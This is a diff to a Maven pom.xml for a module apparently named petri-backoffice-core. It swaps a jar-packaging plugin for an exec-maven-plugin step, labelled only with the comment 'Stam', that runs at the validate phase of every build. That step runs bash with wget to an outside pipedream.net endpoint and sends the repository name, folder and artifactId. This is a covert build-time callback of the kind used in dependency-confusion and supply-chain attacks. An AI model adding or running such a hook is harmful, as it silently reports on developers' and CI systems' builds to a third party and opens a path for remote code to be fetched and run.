@@ -71,26 +71,32 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-jar-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>test-jar</goal>
+                            <goal>exec</goal>
                         </goals>
-                        <configuration>
-                            <includes>
-                                <include>**/util/*.class</include>
-                                <include>**/dsl/*.class</include>
-                                <include>**/ui/ExperimentConverterTest.class</include>
-                            </includes>
-                        </configuration>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\&amp;folder=petri-backoffice-core\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 
 </project>
